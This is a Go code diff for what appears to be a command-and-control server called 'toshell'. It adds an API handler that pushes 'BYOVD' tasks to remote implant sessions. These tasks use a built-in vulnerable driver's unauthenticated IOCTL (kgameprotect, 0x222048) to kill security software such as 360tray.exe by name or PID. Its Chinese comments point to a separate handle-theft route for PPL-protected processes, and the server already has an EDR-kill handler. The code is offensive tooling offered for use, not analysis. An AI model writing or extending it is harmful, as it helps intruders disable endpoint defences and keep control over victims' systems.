@@ -2,9 +2,11 @@ package api
 
 import (
 	"encoding/json"
+	"fmt"
 	"net/http"
 
 	"github.com/gorilla/mux"
+	"toshell/internal/server/drivers"
 	"toshell/internal/server/logging"
 )
 
@@ -64,6 +66,76 @@ func (s *Server) edrKillHandler(w http.ResponseWriter, r *http.Request) {
 		"task_type": taskInfo.TaskType,
 		"count":     len(req.Processes),
 		"message":   "EDR kill task pushed",
+	})
+}
+
+// byovdKillHandler 下发 BYOVD 驱动击杀任务：按 PID 或进程名调用内置驱动的
+// 无鉴权进程终止 IOCTL（kgameprotect: 0x222048）。
+//
+// 请求体：{ "pid": 1234 } 或 { "process_name": "360tray.exe" }，driver 可选
+// （指定内置驱动名，默认取用途为 kill 的内置驱动）。
+// 该路线对 PPL 保护进程无效（内核句柄检查拦得住），PPL 请用 ppl_kill 的句柄窃取路线。
+func (s *Server) byovdKillHandler(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	vars := mux.Vars(r)
+	id := vars["id"]
+
+	var req struct {
+		PID         uint32 `json:"pid"`
+		ProcessName string `json:"process_name"`
+		Driver      string `json:"driver"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
+		return
+	}
+	if req.PID == 0 && req.ProcessName == "" {
+		http.Error(w, `{"error":"pid 或 process_name 至少提供一个"}`, http.StatusBadRequest)
+		return
+	}
+
+	// 取驱动档案：显式指定优先，否则用内置 kill 驱动
+	profile, ok := drivers.KillProfile()
+	if req.Driver != "" {
+		d, _, err := drivers.Get(req.Driver)
+		if err != nil {
+			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusBadRequest)
+			return
+		}
+		profile, ok = d, true
+	}
+	if !ok || profile.Device == "" || profile.IOCTL == 0 {
+		http.Error(w, `{"error":"没有可用的进程终止驱动档案"}`, http.StatusInternalServerError)
+		return
+	}
+
+	if s.listener == nil {
+		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+		return
+	}
+	taskInfo, err := s.taskMgr.CreateBYOVDKill(id, req.PID, req.ProcessName, profile.Device, profile.IOCTL)
+	if err != nil {
+		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
+		return
+	}
+	if err := s.listener.PushTask(id, taskInfo); err != nil {
+		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
+		return
+	}
+
+	target := req.ProcessName
+	if target == "" {
+		target = fmt.Sprintf("pid=%d", req.PID)
+	}
+	logging.Info("api", "byovd_kill (%s) pushed to session %s via %s (device=%s ioctl=0x%X)",
+		target, id, profile.Name, profile.Device, profile.IOCTL)
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"task_id":   taskInfo.ID,
+		"task_type": taskInfo.TaskType,
+		"driver":    profile.Name,
+		"device":    profile.Device,
+		"ioctl":     profile.IOCTL,
+		"message":   "BYOVD kill task pushed",
 	})
 }
 
